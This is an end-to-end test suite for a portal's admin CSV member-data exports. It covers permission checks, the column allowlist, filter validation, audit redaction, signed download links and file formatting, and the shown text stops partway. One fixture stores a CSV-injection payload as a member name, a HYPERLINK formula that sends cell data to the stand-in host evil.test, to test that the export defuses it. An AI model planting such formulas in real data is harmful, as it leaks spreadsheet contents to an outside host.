/* §5.26 Exports: the one action in the portal that takes member data out of it.
 *
 * Everything else staff do leaves the data on the server behind a masking rule and an audit entry.
 * An export puts it in a file on somebody's laptop, where no later change of permission can reach
 * it — so most of what this checks is refusals: the kind's own list permission, the column
 * allowlist, contact columns, the filters being the list's filters, twenty an hour, owner-only
 * downloads, and the permissions being asked again at download rather than trusted from the
 * request.
 *
 * The file itself is fetched from storage and read, because the only thing that proves a CSV is a
 * CSV is opening it. */
const fs = require('fs');
const path = require('path');
const {
  adminHeaders,
  api,
  check,
  fail,
  finish,
  forgetCacheKeys,
  makeAdmin,
  makeUser,
  prisma,
  sweep,
} = require('./harness.cjs');

/** A role with exactly these permissions and nothing else, so a matrix can actually be tested. */
const roleWith = async (label, codes) => {
  const stamp = Date.now() + Math.floor(Math.random() * 1000);
  const code = `e2e_exp_${label}_${stamp}`;
  const permissions = await prisma.permission.findMany({ where: { code: { in: codes } } });

  if (permissions.length !== codes.length) {
    throw new Error(
      `role ${label}: unknown permission(s) ${codes.filter(wanted => !permissions.some(row => row.code === wanted)).join(', ')}`,
    );
  }

  const role = await prisma.role.create({
    data: {
      name: `E2E exports ${label} ${stamp}`,
      code,
      isSystem: false,
      isAdmin: true,
      rolePermissions: {
        create: permissions.map(permission => ({ permissionId: permission.id })),
      },
    },
  });

  return role.code;
};

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

/** Polls an export until it stops being QUEUED or RUNNING. */
const settle = async (headers, id, attempts = 40) => {
  for (let attempt = 0; attempt < attempts; attempt += 1) {
    const res = await api(null, 'GET', `/admin/exports/${id}`, null, headers);

    if (!['QUEUED', 'RUNNING'].includes(res.body?.data?.state)) return res.body?.data;

    await sleep(250);
  }

  return null;
};

(async () => {
  await sweep('pre-run');

  const roles = [];
  const register = async (label, codes) => {
    const code = await roleWith(label, codes);

    roles.push(code);

    return code;
  };

  // The matrix the spec describes, as four roles. The seeded roles cannot express it: Trust &
  // Safety has `members:read` and no `exports:csv`, and the two roles that can export hold every
  // permission there is, so neither can show what happens when one is missing.
  const plain = await register('plain', ['exports:csv', 'members:read']);
  const withPii = await register('pii', ['exports:csv', 'members:read', 'members:pii_reveal']);
  const exportOnly = await register('only', ['exports:csv']);
  const losesPii = await register('loses', ['exports:csv', 'members:read', 'members:pii_reveal']);

  const owner = await makeAdmin('exp-owner', plain);
  const piiOwner = await makeAdmin('exp-pii', withPii);
  const cannotList = await makeAdmin('exp-only', exportOnly);
  const losing = await makeAdmin('exp-losing', losesPii);
  const boss = await makeAdmin('exp-boss');
  const safety = await makeAdmin('exp-safety', 'trust_safety');

  const headers = adminHeaders(owner);
  const piiHeaders = adminHeaders(piiOwner);
  const bossHeaders = adminHeaders(boss);

  // BRISTOL is empty in the demo dataset on purpose, so an export filtered to it contains these
  // fixtures and nothing else — the row count is a number this suite can assert rather than infer.
  const alice = await makeUser('exp-alice', { cityId: 'BRISTOL', journeyStage: 'JUST_ARRIVED' });
  const bob = await makeUser('exp-bob', {
    cityId: 'BRISTOL',
    phoneNumberDiallingCode: '+44',
    phoneNumber: '7700900123',
  });
  const elsewhere = await makeUser('exp-elsewhere', { cityId: 'LONDON' });
  const ghost = await makeUser('exp-ghost', { cityId: 'BRISTOL' });

  // A name that is a formula, and a name that is not ASCII. Both are things a member can type into
  // their own profile, and both end up in a file somebody opens in Excel.
  await prisma.user.update({
    where: { id: alice.id },
    data: { firstName: '=HYPERLINK("https://evil.test/?c="&A1)' },
  });
  await prisma.user.update({ where: { id: bob.id }, data: { firstName: 'Zoë' } });
  // Anonymised accounts are excluded from the member list, so they must be excluded from a file
  // built from the same filters (§5.26 / line 3084).
  await prisma.user.update({
    where: { id: ghost.id },
    data: { isAnonymised: true, anonymisedAt: new Date() },
  });

  const created = [];
  const seedExport = async (requestedById, data) => {
    const row = await prisma.adminExport.create({
      data: { kind: 'MEMBERS', requestedById, params: { columns: ['id'], filters: {} }, ...data },
    });

    created.push(row.id);

    return row;
  };

  console.log('\n── 5.26 The guard stack ─────────────────────────────────────');

  for (const [method, route] of [
    ['POST', '/admin/exports'],
    ['GET', '/admin/exports'],
    ['GET', '/admin/exports/11111111-1111-1111-1111-111111111111'],
    ['POST', '/admin/exports/11111111-1111-1111-1111-111111111111/download'],
  ]) {
    const res = await api(null, method, route, method === 'POST' ? {} : null);

    check(`${method} ${route} needs a token`, res.status === 401 || res.status === 403, res.status);
  }

  let res = await api(null, 'GET', '/admin/exports', null, adminHeaders(safety));
  check(
    'Trust & Safety hold no exports:csv, so the list is refused',
    res.status === 403,
    res.status,
  );

  console.log('\n── The one kind the API does not build ─────────────────────');

  /**
   * Every data kind is built now, so the refusal left is the one that is **not** a refusal of
   * unfinished work: a chart CSV is written in the browser from the payload the staff member is
   * already looking at, and sending the same numbers back out through an export job would be a
   * second path to data that has already left the API.
   */
  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'ANALYTICS_CHART', columns: ['id'] },
    bossHeaders,
  );
  check(
    'a chart export is 422 NOT_AVAILABLE_YET',
    res.status === 422 && res.body?.error?.code === 'NOT_AVAILABLE_YET',
    [res.status, res.body?.error?.code],
  );
  // The message has to say what actually blocks it. It used to name a milestone, which went stale
  // the moment that milestone shipped — a refusal that cites a delivered milestone tells a staff
  // member the opposite of the truth.
  check(
    'and says where the file comes from instead, rather than naming a milestone',
    /portal/.test(res.body?.error?.message ?? '') &&
      !/M2|M3|M4/.test(res.body?.error?.message ?? ''),
    res.body?.error?.message,
  );

  console.log('\n── The audit export carries the asker’s own scope (R8) ─────');

  // A reader with `audit:read_self` sees only their own entries on the list. The export has to
  // apply the same scope, or it is a way around it — which is the one thing that mattered about
  // waiting for the list to exist before building this.
  const selfReaderRole = await register('self', ['exports:csv', 'audit:read_self']);
  const selfReader = await makeAdmin('exp-self-reader', selfReaderRole);
  const selfHeaders = adminHeaders(selfReader);

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'AUDIT', columns: ['occurredAt', 'actor', 'action'] },
    selfHeaders,
  );
  // 202, like every other export request: the file is built by a worker, so the answer is
  // "accepted" rather than "created".
  check('the audit export is accepted now', res.status === 202, res.status || res.body?.error);

  const selfExport = await settle(selfHeaders, res.body?.data?.id);

  check('and it builds', selfExport?.state === 'READY', selfExport);

  const totalEntries = await prisma.auditLog.count();
  const ownEntries = await prisma.auditLog.count({ where: { actorId: selfReader.id } });

  // The whole trail is thousands of rows and this reader has touched almost nothing, so a
  // scope-free export would be orders of magnitude larger than their own slice.
  check(
    'covering only their own entries, not the whole trail',
    (selfExport?.rowCount ?? -1) <= ownEntries + 2 && (selfExport?.rowCount ?? 0) < totalEntries,
    { rowCount: selfExport?.rowCount, own: ownEntries, total: totalEntries },
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'AUDIT', columns: ['occurredAt'], filters: { aria: ['SAFETY'] } },
    selfHeaders,
  );
  check(
    'a filter the audit list does not take is a 400 naming it, not a file over everything',
    res.status === 400 && /aria/.test(JSON.stringify(res.body?.error?.details ?? [])),
    res.body?.error,
  );

  console.log('\n── The support inbox export carries R7 ─────────────────────');

  /**
   * A Guard thread has to **exist** for this to prove anything.
   *
   * The first version of these checks compared "every thread" with "every thread minus the Guard
   * ones" on a database that held no Guard threads, so `1 === 1` passed and the exclusion was
   * never exercised. A test that cannot fail is worse than no test, because it reads as coverage.
   */
  const discloser = await makeUser('exp-discloser');

  res = await api(discloser.token, 'POST', '/guard/threads', {
    subject: 'Something I cannot post publicly',
    message: 'Telling Circl rather than putting it on the feed, for the export R7 check.',
    categoryCode: 'SAFETY',
  });

  check('a Guard thread exists, so the exclusion has something to exclude', res.status === 201, {
    status: res.status,
    error: res.body?.error,
  });

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'SUPPORT_THREADS', columns: ['conversationId', 'type', 'state'] },
    bossHeaders,
  );
  check('the support export is accepted now', res.status === 202, res.status || res.body?.error);

  const bossThreads = await settle(bossHeaders, res.body?.data?.id);
  const allThreads = await prisma.supportThread.count();
  const guardThreads = await prisma.supportThread.count({ where: { type: 'GUARD' } });

  check('and it builds', bossThreads?.state === 'READY', bossThreads);
  check(
    'a super admin exports every thread, Guard ones included',
    bossThreads?.rowCount === allThreads && guardThreads >= 1,
    { rowCount: bossThreads?.rowCount, threads: allThreads, guard: guardThreads },
  );

  const agentRole = await register('agentonly', ['exports:csv', 'support:read']);
  const agent = await makeAdmin('exp-agent', agentRole);
  const agentHeaders = adminHeaders(agent);

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'SUPPORT_THREADS', columns: ['conversationId', 'state'] },
    agentHeaders,
  );

  const agentThreads = await settle(agentHeaders, res.body?.data?.id);

  check(
    'while a support agent’s export leaves the Guard threads out (R7)',
    agentThreads?.state === 'READY' &&
      agentThreads?.rowCount === allThreads - guardThreads &&
      // The difference has to be real: with no Guard thread in the database the two counts are
      // equal and this check proves nothing.
      agentThreads?.rowCount < (bossThreads?.rowCount ?? 0),
    {
      state: agentThreads?.state,
      agent: agentThreads?.rowCount,
      boss: bossThreads?.rowCount,
      guard: guardThreads,
    },
  );

  console.log('\n── The three lists that export themselves ──────────────────');

  /**
   * A case, a strike and a piece of content, **made** rather than assumed.
   *
   * Every check below compares the file's row count with the list's own total, and two counts over
   * an empty table agree without proving anything. The fixtures are in LONDON rather than BRISTOL
   * because the member export above asserts an exact BRISTOL row count.
   */
  const author = await makeUser('exp-author', { cityId: 'LONDON' });
  const reporter = await makeUser('exp-reporter', { cityId: 'LONDON' });
  const warned = await makeUser('exp-warned', { cityId: 'LONDON' });

  res = await api(author.token, 'POST', '/community/requests', {
    title: 'A flat share near the station',
    description: 'Posted so the content export has something of this member’s to find.',
    categoryCode: 'ACCOMMODATION',
    cityId: 'LONDON',
  });

  const authored = res.body?.data?.id;

  check('a request is posted, to be reported and exported', res.status === 201, res.body?.error);

  res = await api(reporter.token, 'POST', '/moderation/reports', {
    targetType: 'REQUEST',
    targetId: authored,
    reasonCode: 'SPAM',
    note: 'Reported so the case export has a case in it.',
  });
  check('and reported, so there is a case to export', res.status === 202, res.body?.error);

  res = await api(
    null,
    'POST',
    `/admin/members/${warned.id}/warn`,
    { reasonCode: 'POLICY_VIOLATION', policySubtype: 'SPAM', message: 'Please stop.' },
    { ...bossHeaders, 'Idempotency-Key': require('crypto').randomUUID() },
  );
  check('and a warning is issued, which the enforcement log carries', res.status === 200, [
    res.status,
    res.body?.error,
  ]);

  /** The list's own total for the same question, which is what the file has to agree with. */
  const listTotal = async (route, headersFor) => {
    const page = await api(null, 'GET', route, null, headersFor);

    return page.body?.meta?.totalCount ?? -1;
  };

  /** The file, read as lines with the header dropped. */
  const linesOf = async (id, headersFor) => {
    const link = await api(null, 'POST', `/admin/exports/${id}/download`, null, headersFor);
    const url = link.body?.data?.url;

    // A check that cannot read the file has to fail as a check rather than as a stack trace: a
    // crash here ends the run and takes every check after it with it.
    if (!url) {
      check('the file could be downloaded, so the rows below were read', false, link.body?.error);

      return [];
    }

    const file = await fetch(url);
    const csv = Buffer.from(await file.arrayBuffer()).toString('utf8');

    return csv.replace(/^﻿/, '').trim().split('\r\n').slice(1);
  };

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'REPORTS', columns: ['id', 'state', 'reasonCodes', 'firstReportedAt'] },
    bossHeaders,
  );
  check('a report-case export is accepted', res.status === 202, res.status || res.body?.error);

  const casesFile = await settle(bossHeaders, res.body?.data?.id);
  const openCases = await listTotal('/admin/reports/cases?perPage=1', bossHeaders);

  check('and it builds', casesFile?.state === 'READY', casesFile);
  check(
    'over the list’s own predicate, so the file and the screen are the same set of cases',
    casesFile?.rowCount === openCases && openCases > 0,
    { rowCount: casesFile?.rowCount, list: openCases },
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'REPORTS', columns: ['id', 'state'], filters: { state: 'DISMISSED' } },
    bossHeaders,
  );

  const decidedFile = await settle(bossHeaders, res.body?.data?.id);
  const decidedCases = await listTotal(
    '/admin/reports/cases?state=DISMISSED&perPage=1',
    bossHeaders,
  );

  check(
    'and a state filter narrows the file exactly as it narrows the list',
    decidedFile?.rowCount === decidedCases && decidedFile?.rowCount < openCases,
    { rowCount: decidedFile?.rowCount, list: decidedCases, open: openCases },
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'REPORTS', columns: ['id'], filters: { stat: 'OPEN' } },
    bossHeaders,
  );
  check(
    'a misspelled case filter is a 400 naming it, not a file over every case',
    res.status === 400 && /stat/.test(JSON.stringify(res.body?.error?.details ?? [])),
    res.body?.error,
  );

  res = await api(null, 'POST', '/admin/exports', { kind: 'REPORTS', columns: ['id'] }, headers);
  check(
    'and exporting cases needs the case list’s permission, which this role has not got',
    res.status === 403,
    res.status,
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    {
      kind: 'ENFORCEMENT',
      columns: ['member', 'kind', 'reasonCode', 'issuedAt', 'active'],
      // No `sort`: an export covers every matching row, so the service refuses paging parameters
      // by name. The order is the log's own, which is what makes the offset paging under this safe.
      filters: { kind: 'STRIKE' },
    },
    bossHeaders,
  );
  check('an enforcement export is accepted', res.status === 202, res.status || res.body?.error);

  const logFile = await settle(bossHeaders, res.body?.data?.id);
  const logTotal = await listTotal('/admin/enforcement?perPage=1&kind=STRIKE', bossHeaders);

  check('and it builds', logFile?.state === 'READY', logFile);
  check(
    'with one row per strike and suspension, the list’s own union',
    logFile?.rowCount === logTotal && logTotal > 0,
    { rowCount: logFile?.rowCount, list: logTotal },
  );

  const logLines = await linesOf(logFile?.id, bossHeaders);

  check(
    'naming the member and their id, so a row can be looked up from the file',
    logLines.some(line => line.includes(`(${warned.id})`)),
    logLines.slice(0, 2),
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'CONTENT', columns: ['targetType', 'targetId', 'visibilityState', 'createdAt'] },
    bossHeaders,
  );
  check('a content export is accepted', res.status === 202, res.status || res.body?.error);

  const contentFile = await settle(bossHeaders, res.body?.data?.id);

  check('and it builds', contentFile?.state === 'READY', contentFile);

  const contentLines = await linesOf(contentFile?.id, bossHeaders);
  const types = new Set(contentLines.map(line => line.split(',')[0]));

  check(
    'covering every kind in one file, which is what the targetType column is for',
    types.size > 1 && contentLines.length === contentFile?.rowCount,
    { types: [...types].slice(0, 6), lines: contentLines.length, rowCount: contentFile?.rowCount },
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'CONTENT', columns: ['targetType', 'targetId'], filters: { authorId: author.id } },
    bossHeaders,
  );

  const mineFile = await settle(bossHeaders, res.body?.data?.id);

  check(
    'a filter every kind understands narrows it, here to one member’s content',
    mineFile?.rowCount >= 1 && mineFile?.rowCount < contentFile?.rowCount,
    { mine: mineFile?.rowCount, all: contentFile?.rowCount },
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'CONTENT', columns: ['targetId'], filters: { published: 'true' } },
    bossHeaders,
  );
  check(
    'but a filter belonging to one kind is refused by name, not applied to the other sixteen',
    res.status === 400 && /published/.test(JSON.stringify(res.body?.error?.details ?? [])),
    res.body?.error,
  );
  check(
    'and the refusal says how to ask for that kind, because "use its list" was not an option',
    /Set "type"/.test(res.body?.error?.message ?? ''),
    res.body?.error?.message,
  );

  /**
   * One kind, with its own filters — the way out the refusal above promises.
   *
   * There was none: the message said "export from that type's list instead" and no such export
   * existed, so a type-specific filter was simply unusable.
   */
  res = await api(
    null,
    'POST',
    '/admin/exports',
    {
      kind: 'CONTENT',
      columns: ['targetType', 'targetId'],
      filters: { type: 'guides', published: 'true' },
    },
    bossHeaders,
  );
  check('a content export can be narrowed to one kind', res.status === 202, {
    status: res.status,
    error: res.body?.error,
  });

  const guidesFile = await settle(bossHeaders, res.body?.data?.id);
  const guideLines = guidesFile?.state === 'READY' ? await linesOf(guidesFile.id, bossHeaders) : [];

  check(
    'and then takes that kind’s own filters, which the all-kinds file cannot',
    guidesFile?.state === 'READY' &&
      guideLines.length > 0 &&
      guideLines.every(line => line.startsWith('GUIDE')),
    { state: guidesFile?.state, rows: guideLines.length, first: guideLines[0] },
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'CONTENT', columns: ['targetId'], filters: { type: 'stores', ratings: '5' } },
    bossHeaders,
  );
  check(
    'but another kind’s filter is still refused, even with a type set',
    res.status === 400 && /ratings/.test(JSON.stringify(res.body?.error ?? {})),
    res.body?.error?.message,
  );

  /**
   * A filter every kind offers and some kinds cannot answer.
   *
   * Nine of the seventeen have no city column, and `scope()` **skipped** the clause for those —
   * so a file asked for one city held every review, service and item on the platform. They are
   * left out now: a review has no city, so it cannot be in one.
   */
  res = await api(
    null,
    'POST',
    '/admin/exports',
    {
      kind: 'CONTENT',
      columns: ['targetType', 'targetId'],
      filters: { cityIds: 'LONDON' },
    },
    bossHeaders,
  );

  const cityFile = await settle(bossHeaders, res.body?.data?.id);
  const cityTypes = new Set(
    (cityFile?.state === 'READY' ? await linesOf(cityFile.id, bossHeaders) : []).map(
      line => line.split(',')[0],
    ),
  );

  check(
    'a city-filtered content export leaves out the kinds that have no city',
    cityFile?.state === 'READY' &&
      cityTypes.size > 0 &&
      !cityTypes.has('REVIEW') &&
      !cityTypes.has('SERVICE') &&
      !cityTypes.has('STORE_ITEM'),
    [...cityTypes],
  );

  res = await api(null, 'GET', '/admin/content/reviews?cityIds=LONDON', null, bossHeaders);

  check(
    'and the list refuses the same filter by name rather than answering with every review',
    res.status === 400 && /cityIds/.test(JSON.stringify(res.body?.error ?? {})),
    { status: res.status, message: res.body?.error?.message },
  );

  console.log('\n── What may be asked for ────────────────────────────────────');

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'] },
    adminHeaders(cannotList),
  );
  check('exports:csv without members:read cannot export members', res.status === 403, [
    res.status,
    res.body?.error?.message,
  ]);

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id', 'passwordHash'] },
    headers,
  );
  check(
    'a column outside the allowlist is refused by name',
    res.status === 400 && /passwordHash/.test(res.body?.error?.message ?? ''),
    res.body?.error?.message,
  );
  check(
    'and the refusal lists what may be asked for instead',
    /lastActiveAt/.test(JSON.stringify(res.body?.error?.details ?? [])),
    res.body?.error?.details,
  );

  res = await api(null, 'POST', '/admin/exports', { kind: 'MEMBERS', columns: [] }, headers);
  check('no columns at all is refused', res.status === 400, res.status);

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id', 'email'] },
    headers,
  );
  check(
    'a contact column needs members:pii_reveal, even with exports:csv',
    res.status === 403 && /contact/i.test(res.body?.error?.message ?? ''),
    [res.status, res.body?.error?.message],
  );
  check(
    'and the refusal says which column, so the portal can stop offering it',
    (res.body?.error?.details ?? []).some(detail => detail.field === 'email'),
    res.body?.error?.details,
  );

  console.log('\n── The filters are the list’s filters ───────────────────────');

  for (const [param, value] of [
    ['page', 2],
    ['perPage', 50],
    ['sort', 'createdAt'],
    ['order', 'asc'],
  ]) {
    res = await api(
      null,
      'POST',
      '/admin/exports',
      { kind: 'MEMBERS', columns: ['id'], filters: { [param]: value } },
      headers,
    );
    check(
      `a ${param} in the filters is refused — an export covers every matching row`,
      res.status === 400 && new RegExp(param).test(res.body?.error?.message ?? ''),
      [res.status, res.body?.error?.message],
    );
  }

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'], filters: { notAFilter: 'x' } },
    headers,
  );
  check(
    'a filter the list does not have is refused rather than ignored',
    res.status === 400 && /notAFilter/.test(JSON.stringify(res.body?.error ?? {})),
    res.body?.error,
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'], filters: { statuses: 'HIBERNATING' } },
    headers,
  );
  check(
    'a value the list refuses is refused here too, not widened to every row',
    res.status === 400,
    [res.status, res.body?.error?.message],
  );

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'], filters: { q: 'someone@example.test' } },
    headers,
  );
  check('searching by email needs members:pii_reveal here too (§5.4)', res.status === 403, [
    res.status,
    res.body?.error?.message,
  ]);

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id'], filters: { cityIds: 'NOT_A_CITY' } },
    headers,
  );
  check(
    'a city nobody has is refused, because a dropped filter would widen the file',
    res.status === 400,
    [res.status, res.body?.error?.message],
  );

  console.log('\n── Asking for one ──────────────────────────────────────────');

  res = await api(
    null,
    'POST',
    '/admin/exports',
    {
      kind: 'MEMBERS',
      // Shuffled on purpose: the file comes back in the kind's order, not the request's.
      columns: ['city', 'id', 'journeyStage', 'name', 'createdAt'],
      filters: { cityIds: 'BRISTOL' },
    },
    headers,
  );
  check('an export is accepted with 202, not 200', res.status === 202, res.status);

  const queued = res.body?.data;

  created.push(queued?.id);
  check('and comes back QUEUED', queued?.state === 'QUEUED', queued);
  check(
    'with the columns in the allowlist’s order',
    JSON.stringify(queued?.columns) ===
      JSON.stringify(['id', 'name', 'city', 'journeyStage', 'createdAt']),
    queued?.columns,
  );
  check(
    'and nothing it cannot know yet',
    queued?.rowCount === null && queued?.completedAt === null && queued?.expiresAt === null,
    queued,
  );
  check(
    'and never the storage key',
    !Object.keys(queued ?? {}).includes('storageKey'),
    Object.keys(queued ?? {}),
  );

  let entry = await prisma.auditLog.findFirst({
    where: { action: 'export.requested', targetId: queued?.id },
  });

  check('asking for one is audited', !!entry, entry?.action);
  check(
    'with the kind and the columns, which is what the trail is for',
    entry?.metadata?.kind === 'MEMBERS' && Array.isArray(entry?.metadata?.columns),
    entry?.metadata,
  );
  check(
    'and the filters that were in force',
    entry?.metadata?.filters?.cityIds === 'BRISTOL',
    entry?.metadata?.filters,
  );

  // S14.3: the free-text search never reaches the trail. A staff member typing somebody's email
  // into the search box must not write that address into a second place that outlives the search.
  res = await api(
    null,
    'POST',
    '/admin/exports',
    {
      kind: 'MEMBERS',
      columns: ['id'],
      filters: { q: 'zqx-not-in-the-trail', cityIds: 'BRISTOL' },
    },
    headers,
  );
  check('an export may be filtered by a search', res.status === 202, res.body?.error);
  created.push(res.body?.data?.id);

  const searched = await prisma.auditLog.findFirst({
    where: { action: 'export.requested', targetId: res.body?.data?.id },
  });

  check(
    'but the term itself appears nowhere in the entry (S14.3)',
    !JSON.stringify(searched?.metadata ?? {}).includes('zqx-not-in-the-trail'),
    searched?.metadata,
  );
  check(
    'and a marker sits where it was, so the entry still says a search was part of the question',
    searched?.metadata?.filters?.search === '[redacted]' &&
      searched?.metadata?.filters?.q === undefined,
    searched?.metadata?.filters,
  );
  check(
    'while the filters beside it are recorded as sent',
    searched?.metadata?.filters?.cityIds === 'BRISTOL',
    searched?.metadata?.filters,
  );

  const ready = await settle(headers, queued?.id);

  check('the worker builds it', ready?.state === 'READY', ready);
  check(
    'and counts the rows it wrote: the two members in Bristol, not the anonymised third',
    ready?.rowCount === 2,
    ready?.rowCount,
  );

  res = await api(null, 'GET', '/admin/members?cityIds=BRISTOL&perPage=100', null, headers);
  check(
    'which is exactly what the member list says with the same filter',
    res.body?.meta?.totalCount === ready?.rowCount,
    [res.body?.meta?.totalCount, ready?.rowCount],
  );

  check(
    'the file is kept seven days',
    Math.abs(new Date(ready?.expiresAt) - new Date(ready?.completedAt) - 7 * 86400000) < 60_000,
    [ready?.completedAt, ready?.expiresAt],
  );

  console.log('\n── Downloading it ──────────────────────────────────────────');

  res = await api(null, 'POST', `/admin/exports/${queued.id}/download`, null, headers);
  check('the owner gets a link', res.status === 200 && !!res.body?.data?.url, res.body?.error);

  const link = res.body?.data?.url ?? '';

  check(
    'which is https and carries no credentials in the userinfo',
    /^https:\/\/[^@]*$/.test(link),
    link.slice(0, 60),
  );
  check(
    'and expires in five minutes, signed into the URL',
    /X-Amz-Expires=300/.test(link),
    link.slice(-120),
  );
  check(
    'and the link says expiresAt, about five minutes out',
    Math.abs(new Date(res.body?.data?.expiresAt) - Date.now() - 300_000) < 30_000,
    res.body?.data?.expiresAt,
  );

  entry = await prisma.auditLog.findFirst({
    where: { action: 'export.downloaded', targetId: queued.id },
  });
  check('and every download is audited', !!entry, entry?.action);

  const file = await fetch(link);
  // Read as bytes, not text: `Response.text()` strips a leading UTF-8 byte-order mark while
  // decoding, so a file with one and a file without are the same string by the time it arrives —
  // which is exactly the thing being asserted two checks below.
  const bytes = Buffer.from(await file.arrayBuffer());
  const csv = bytes.toString('utf8');

  check('the link fetches the file', file.status === 200, file.status);
  check(
    'which saves rather than opens, under a name that says what it is',
    /attachment; filename="members-\d{4}-\d{2}-\d{2}\.csv"/.test(
      file.headers.get('content-disposition') ?? '',
    ),
    file.headers.get('content-disposition'),
  );
  check(
    'it starts with a byte-order mark, or Excel mangles every accented name',
    bytes.subarray(0, 3).equals(Buffer.from([0xef, 0xbb, 0xbf])),
    bytes.subarray(0, 8),
  );

  const lines = csv.replace(/^﻿/, '').trim().split('\r\n');

  check('CRLF, as RFC 4180 says', csv.includes('\r\n'), JSON.stringify(csv.slice(0, 40)));
  check(
    'the header row is the columns that were asked for',
    lines[0] === 'id,name,city,journeyStage,createdAt',
    lines[0],
  );
  check('one line per row, plus the header', lines.length === 3, lines.length);
  check(
    'a name that is a formula is defused, not executed',
    lines.some(line => line.includes("'=HYPERLINK")),
    lines.slice(1),
  );
  check(
    'and an accented name survives the trip',
    lines.some(line => line.includes('Zoë')),
    lines.slice(1),
  );
  check(
    'the city is the name staff read, not the id',
    lines.slice(1).every(line => line.includes('Bristol')),
    lines.slice(1),
  );
  check(
    'and the member outside the filter is not in the file',
    !csv.includes(elsewhere.id),
    elsewhere.id,
  );
  check('nor is the anonymised one', !csv.includes(ghost.id), ghost.id);

  console.log('\n── Contact columns ─────────────────────────────────────────');

  res = await api(
    null,
    'POST',
    '/admin/exports',
    {
      kind: 'MEMBERS',
      columns: ['id', 'email', 'phone'],
      filters: { cityIds: 'BRISTOL' },
    },
    piiHeaders,
  );
  check('members:pii_reveal may export contact details', res.status === 202, res.body?.error);

  const contact = res.body?.data;

  created.push(contact?.id);

  const contactReady = await settle(piiHeaders, contact?.id);

  check('and it builds', contactReady?.state === 'READY', contactReady);

  res = await api(null, 'POST', `/admin/exports/${contact.id}/download`, null, piiHeaders);

  const contactCsv = Buffer.from(await (await fetch(res.body?.data?.url)).arrayBuffer()).toString(
    'utf8',
  );

  check(
    'the plaintext address is in the file, not the masked one',
    contactCsv.includes(bob.email) && !contactCsv.includes('***'),
    contactCsv.split('\r\n')[1],
  );
  check(
    'and the phone number as it would be dialled',
    contactCsv.includes('+447700900123'),
    contactCsv.split('\r\n').slice(1, 3),
  );

  console.log('\n── Losing the permission loses the file ────────────────────');

  const losingHeaders = adminHeaders(losing);

  res = await api(
    null,
    'POST',
    '/admin/exports',
    { kind: 'MEMBERS', columns: ['id', 'email'], filters: { cityIds: 'BRISTOL' } },
    losingHeaders,
  );
  check('an export of contact details is asked for', res.status === 202, res.body?.error);

  const fragile = res.body?.data;

  created.push(fragile?.id);
  await settle(losingHeaders, fragile?.id);

  const piiPermission = await prisma.permission.findUniqueOrThrow({
    where: { code: 'members:pii_reveal' },
  });
  const losingRole = await prisma.role.findUniqueOrThrow({ where: { code: losesPii } });

  await prisma.rolePermission.delete({
    where: { roleId_permissionId: { roleId: losingRole.id, permissionId: piiPermission.id } },
  });
  await forgetCacheKeys(`*admin:role-perms:${losesPii}*`);

  res = await api(null, 'POST', `/admin/exports/${fragile.id}/download`, null, losingHeaders);
  check(
    'and once the permission is gone, so is the download (§5.26, line 3047)',
    res.status === 403,
    [res.status, res.body?.error?.message],
  );

  res = await api(null, 'GET', `/admin/exports/${fragile.id}`, null, losingHeaders);
  check(
    'though the row is still theirs to see, so they know what they asked for',
    res.status === 200 && res.body?.data?.state === 'READY',
    [res.status, res.body?.data?.state],
  );

  console.log('\n── Whose export is it ──────────────────────────────────────');

  res = await api(null, 'GET', `/admin/exports/${queued.id}`, null, piiHeaders);
  check(
    'somebody else’s export is a 404, not a 403: ids out of a log stay uninformative',
    res.status === 404,
    res.status,
  );

  res = await api(null, 'GET', `/admin/exports/${queued.id}`, null, bossHeaders);
  check('exports:read_all turns that into a row', res.status === 200, res.status);

  res = await api(null, 'POST', `/admin/exports/${queued.id}/download`, null, bossHeaders);
  check('but seeing everybody’s exports is not downloading them', res.status === 403, [
    res.status,
    res.body?.error?.message,
  ]);

  res = await api(null, 'GET', '/admin/exports?all=true', null, bossHeaders);
  check(
    'all=true returns other people’s, with who asked',
    res.status === 200 &&
      res.body.data.some(row => row.id === queued.id && row.requestedBy?.id === owner.id),
    res.body?.data?.slice(0, 2),
  );
  check(
    'and a requestedBy a dropdown can draw: a name and a role, no contact details',
    (() => {
      const row = res.body.data.find(entry => entry.requestedBy);

      return (
        row &&
        !!row.requestedBy.name &&
        !!row.requestedBy.role &&
        !Object.keys(row.requestedBy).some(key => ['email', 'phone'].includes(key))
      );
    })(),
    res.body?.data?.find(entry => entry.requestedBy)?.requestedBy,
  );

  res = await api(null, 'GET', '/admin/exports?all=true', null, headers);
  check(
    'without exports:read_all the flag is ignored rather than refused',
    res.status === 200 && res.body.data.every(row => row.id !== contact.id),
    res.body?.data?.map(row => row.id),
  );
  check(
    'and nobody’s name is attached to a list of your own exports',
    res.body.data.every(row => row.requestedBy === undefined),
    res.body?.data?.slice(0, 2),
  );
  check(
    'newest first',
    res.body.data.every(
      (row, index) =>
        index === 0 || new Date(res.body.data[index - 1].createdAt) >= new Date(row.createdAt),
    ),
    res.body?.data?.map(row => row.createdAt),
  );

  console.log('\n── Not ready, failed, expired ──────────────────────────────');

  const stillQueued = await seedExport(owner.id, {});

